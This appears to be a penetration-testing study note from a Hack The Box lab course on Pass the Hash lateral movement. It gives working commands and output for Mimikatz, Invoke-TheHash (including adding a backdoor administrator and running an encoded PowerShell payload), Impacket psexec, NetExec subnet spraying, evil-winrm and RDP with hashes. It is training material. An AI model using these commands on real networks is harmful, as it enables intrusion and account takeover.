A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.

## Pass the Hash with Mimikatz (Windows)

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#pass-the-hash-with-mimikatz-windows)

The first tool we will use to perform a Pass the Hash attack is [Mimikatz](https://github.com/gentilkiwi). Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password.

- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

#### Pass the Hash from Windows Using Mimikatz

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#pass-the-hash-from-windows-using-mimikatz)

```c
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

Now we can use cmd.exe to execute commands in the user's context. For this example, `julio` can connect to a shared folder named `julio` on the DC.

![[Pasted image 20250912194634.png]]

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#pass-the-hash-with-powershell-invoke-thehash-windows)

Another tool we can use to perform Pass the Hash attacks on Windows is [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash). This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB.

When using `Invoke-TheHash`, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

- `Target` - Hostname or IP address of the target.
- `Username` - Username to use for authentication.
- `Domain` - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- `Hash` - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- `Command` - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

#### Invoke-TheHash with SMB

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#invoke-thehash-with-smb)

```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

We can also get a reverse shell connection in the target machine.

#### Invoke-TheHash with WMI

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#invoke-thehash-with-wmi)

```
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e base64endodedpayload"

[+] Command executed with process id 520 on DC01
```

## Pass the Hash with Impacket (Linux)

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#pass-the-hash-with-impacket-linux)

[Impacket](https://github.com/SecureAuthCorp/impacket) has several tools we can use for different operations such as `Command Execution` and `Credential Dumping`, `Enumeration`, etc. For this example, we will perform command execution on the target machine using `PsExec`.

#### Pass the Hash with Impacket PsExec

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#pass-the-hash-with-impacket-psexec)

```shell
n1tesh0x00@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Pass the Hash with NetExec (Linux)

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#pass-the-hash-with-netexec-linux)

[NetExec](https://github.com/Pennyw0rth/NetExec) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. We can use NetExec to try to authenticate to some or all hosts in a network looking for one host where we can authenticate successfully as a local admin.

#### Pass the Hash with NetExec(All hosts)

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#pass-the-hash-with-netexecall-hosts)

```shell
n1tesh0x00@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

If we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see `Pwn3d!`, it means that the user is a local administrator on the target computer. We can use the option `-x` to execute commands.

#### NetExec - Command Execution

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#netexec---command-execution)

```shell
n1tesh0x00@htb[/htb]$ netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## Pass the Hash with evil-winrm (Linux)

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#pass-the-hash-with-evil-winrm-linux)

```shell
n1tesh0x00@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

## Pass the Hash with RDP (Linux)

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#pass-the-hash-with-rdp-linux)

We can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

There are a few caveats to this attack:

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

#### Enable Restricted Admin Mode to allow PtH

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#enable-restricted-admin-mode-to-allow-pth)

```c
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:

#### Pass the Hash using RDP

[](https://github.com/n1tesh0x00/Obsidian-Backup/blob/main/HacktheBox%20Penetration%20Tester%20Path/Password%20Attacks/Windows%20Lateral%20Movement%20Techniques/Pass%20the%20Hash%20\(PtH\).md#pass-the-hash-using-rdp)

```shell
n1tesh0x00@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```